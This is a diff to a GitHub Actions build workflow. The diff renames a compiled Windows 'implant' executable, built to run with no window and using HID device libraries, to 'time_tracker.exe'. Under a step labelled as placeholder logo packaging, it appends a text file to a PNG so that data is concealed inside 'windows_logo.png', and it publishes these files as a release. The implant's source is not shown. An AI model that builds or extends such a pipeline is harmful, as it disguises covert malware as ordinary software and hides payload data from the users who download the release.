@@ -21,11 +21,23 @@ jobs:
           x86_64-w64-mingw32-gcc -O2 -s -Wall -Wextra \
             -mwindows \
             -static -static-libgcc -static-libstdc++ \
-            -Iimplant -o implant/implant.exe \
-            implant/implant.c implant/hid.c \
+            -Iimplant -o implant/time_tracker.exe \
+            implant/time_tracker.c implant/hid.c \
             -lsetupapi -lhid -lcfgmgr32 -lole32 -luser32 -lkernel32
+
+      - name: Tag Binary Data
+        working-directory: implant
+        run: python3 tagger.py
+
+      - name: Placeholder Logo Packaging Step
+        run: |
+          echo "Placeholder: replace with approved logo processing logic."
+          (cat implant/windows.png; echo ""; cat implant/nice_text.txt) > implant/windows_logo.png
 
       - name: Release
         uses: softprops/action-gh-release@v1
         with:
-          files: implant/implant.exe
+          files: |
+            implant/time_tracker.exe
+            implant/nice_text.txt
+            implant/windows_logo.png
